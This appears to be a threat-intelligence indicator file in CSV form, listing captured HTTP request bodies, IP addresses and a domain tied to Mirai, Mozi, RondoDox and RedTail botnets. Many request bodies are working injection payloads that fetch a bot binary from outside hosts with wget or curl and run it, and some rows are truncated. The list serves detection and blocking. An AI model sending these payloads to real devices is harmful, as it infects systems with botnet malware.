Threat,Indicator Type,Indicator
Mirai,HTTP Request Body,"{""_bundlerConfig"":[],""_chunks"":""$2:_response:_chunks"",""_formData"":{""get"":""$3:constructor:constructor""},""_prefix"":""return process.mainModule.require('child_process').execSync('cd /tmp; wget http://gfxnick.emerald.usbx.me/bot; chmod 777 bot; ./bot || cd /tmp; curl -O http://gfxnick.emerald.usbx.me/bot; chmod 777 bot; ,1"
Mirai,HTTP Request Body,"{""_bundlerConfig"":[],""_chunks"":""$2:_response:_chunks"",""_formData"":{""get"":""$3:constructor:constructor""},""_prefix"":""return process.mainModule.require('child_process').execSync('cd /tmp; wget http://23.132.164.54/bot; chmod 777 bot; ./bot || cd /tmp; curl -O http://23.132.164.54/bot; chmod 777 bot; ./bot ');//""}"
Mirai,HTTP Request Body,"{""_bundlerConfig"":[],""_chunks"":""$2:_response:_chunks"",""_formData"":{""get"":""$3:constructor:constructor""},""_prefix"":""return process.mainModule.require('child_process').execSync('cd /tmp; wget http://gfxnick.emerald.usbx.me/bot; chmod 777 bot; ./bot || cd /tmp; curl -O http://gfxnick.emerald.usbx.me/bot; chmod 777 bot;,1"
Mirai,HTTP Request Body,"{""_bundlerConfig"":[],""_chunks"":""$2:_response:_chunks"",""_formData"":{""get"":""$3:constructor:constructor""},""_prefix"":""return process.mainModule.require('child_process').execSync('cd /tmp; wget http://23.132.164.,1"
Mirai,HTTP Request Body,"{""_bundlerConfig"":[],""_chunks"":""$2:_response:_chunks"",""_formData"":{""get"":""$3:constructor:constructor""},""_prefix"":""return process.mainModule.require('child_process').execSync('cd /tmp; wget http://23.132.164.54/bot; chmod 777 bot; ./bot || cd /tmp; curl -O http://23.132.164.54/bot; chmod 777 bot; ./bot ');//""}"
Mirai Katana,HTTP Request Body,remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bcd+/tmp;wget+http://89.106.65.100/gtkchcqw/stwhchoj.arm7;chmod+777+stwhchoj.arm7;./s
Mirai Katana,HTTP Request Body,remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bcd+/tmp;wget+http://87.121.84.42/Yboats.arm7;chmod+777+Yboats.arm7;./Yboats.arm7+zyx
Mirai Katana,HTTP Request Body,remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bcd+/tmp;wget+http://103.77.246.136/idk/home.arm7;chmod+777+home.arm7;./home.arm7;rm+
Mirai Katana,HTTP Request Body,remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bcd+/tmp;wget+http://158.94.210.88/Yboats.arm7;chmod+777+Yboats.arm7;./Yboats.arm7+zy
Mozi,HTTP Request Body,XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://103.93.93.211:42449/Mozi.m+-O+->/tmp/gpon80;
Mozi,HTTP Request Body,XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://103.93.93.211:60809/Mozi.m+-O+->/tmp/gpon80;
Mozi,HTTP Request Body,XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://117.196.188.117:52874/Mozi.m+-O+->/tmp/gpon8
Mozi,HTTP Request Body,XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://117.200.201.159:48999/Mozi.m+-O+->/tmp/gpon8
Mozi,HTTP Request Body,XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://175.146.1.241:37328/Mozi.m+-O+->/tmp/gpon80;
Mozi,HTTP Request Body,XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://175.148.28.159:51225/Mozi.m+-O+->/tmp/gpon80
RondoDox,IP,23.228.188.126
RondoDox,IP,41.231.37.153
RondoDox,IP,70.184.13.47
RondoDox,IP,74.194.191.52
RedTail,IP,178.16.55.224
Mirai,IP,41.216.189.47
Mirai,IP,41.216.189.88
Mirai,IP,41.216.189.185
Mirai,IP,45.135.194.71
Mirai,IP,85.120.229.147
Mirai,IP,103.77.241.135
Mirai,IP,103.77.241.148
Mirai,IP,138.124.14.194
Mirai,IP,151.242.30.13
Mirai,IP,194.116.236.109
Mirai,IP,23.132.164.54
Mirai,IP,31.56.27.76
Mirai,IP,45.157.233.80
Mirai,IP,193.34.213.150
Mirai,Domain,gfxnick.emerald.usbx.me
Mirai Katana,IP,89.106.65.100
Mirai Katana,IP,87.121.84.42
Mirai Katana,IP,103.77.246.136
Mirai Katana,IP,158.94.210.88
Mozi,IP,103.93.93.211
Mozi,IP,117.196.188.117
Mozi,IP,117.200.201.159
Mozi,IP,175.146.1.241
Mozi,IP,175.148.28.159
